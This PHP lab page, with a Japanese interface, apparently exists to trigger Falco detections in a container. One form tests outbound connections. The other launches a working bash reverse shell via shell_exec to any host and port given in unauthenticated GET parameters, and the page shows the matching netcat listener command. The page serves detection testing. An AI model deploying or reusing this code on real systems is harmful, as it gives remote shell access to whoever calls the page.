<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"><title>③ リバースシェル</title>
<style>
body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 2rem; }
h1 { color: #e94560; }
pre { background: #0f3460; padding: 1rem; border-radius: 4px; white-space: pre-wrap; }
input[type=text] { width: 300px; padding: 0.4rem; background: #16213e; color: #e0e0e0; border: 1px solid #0f3460; }
input[type=number] { width: 100px; padding: 0.4rem; background: #16213e; color: #e0e0e0; border: 1px solid #0f3460; }
input[type=submit] { padding: 0.4rem 1rem; background: #e94560; color: white; border: none; cursor: pointer; }
.info { color: #888; font-size: 0.85rem; }
.warn { color: #ff9800; }
a { color: #4fc3f7; }
</style>
</head>
<body>
<h1>③ リバースシェル（外向き接続）</h1>
<p class="info">
  指定したホスト:ポートへの外向きTCP接続を試みます。<br>
  <strong>VCDトリガー:</strong> コンテナからの予期しない外向き接続を Falco が検知します。
</p>

<h3>接続テスト（外向き通信確認用）</h3>
<form method="GET">
  <label>接続先ホスト: </label>
  <input type="text" name="host" value="<?= htmlspecialchars($_GET['host'] ?? '1.1.1.1') ?>"><br><br>
  <label>ポート: </label>
  <input type="number" name="port" value="<?= htmlspecialchars($_GET['port'] ?? '80') ?>"><br><br>
  <input type="submit" value="接続テスト（fsockopen）">
</form>

<h3>リバースシェル実行</h3>
<p class="warn">⚠ 接続先でリスナーが起動していることを確認してから実行してください。</p>
<form method="GET">
  <input type="hidden" name="action" value="reverse">
  <label>リスナーホスト: </label>
  <input type="text" name="host" value="<?= htmlspecialchars($_GET['host'] ?? '192.168.1.100') ?>"><br><br>
  <label>ポート: </label>
  <input type="number" name="port" value="<?= htmlspecialchars($_GET['port'] ?? '4444') ?>"><br><br>
  <input type="submit" value="リバースシェル接続">
</form>

<h3>リスナーの起動方法（検証者側）:</h3>
<pre>nc -lvnp 4444</pre>

<?php
$host   = $_GET['host'] ?? '';
$port   = (int)($_GET['port'] ?? 0);
$action = $_GET['action'] ?? '';

if ($host && $port) {
    if ($action === 'reverse') {
        // bash リバースシェル（VCDトリガー: シェル起動 + 外向き接続）
        $cmd = "bash -i >& /dev/tcp/" . escapeshellarg($host) . "/" . $port . " 0>&1";
        echo "<pre>実行: " . htmlspecialchars($cmd) . "\n";
        // バックグラウンドで実行
        shell_exec("nohup bash -c " . escapeshellarg($cmd) . " > /dev/null 2>&1 &");
        echo "リバースシェルを起動しました（バックグラウンド）</pre>";
    } else {
        // 外向き接続テスト
        echo "<pre>接続テスト: " . htmlspecialchars($host) . ":" . $port . "\n";
        $errno  = 0;
        $errstr = '';
        $fp = @fsockopen($host, $port, $errno, $errstr, 3);
        if ($fp) {
            echo "接続成功（外向き通信できます）\n";
            fclose($fp);
        } else {
            echo "接続失敗: " . htmlspecialchars($errstr) . " (errno={$errno})\n";
            echo "※ 接続失敗でも TCP SYN は送信されるため Falco が検知します\n";
        }
        echo "</pre>";
    }
}
?>

<p><a href="index.php">← 戻る</a></p>
</body>
</html>
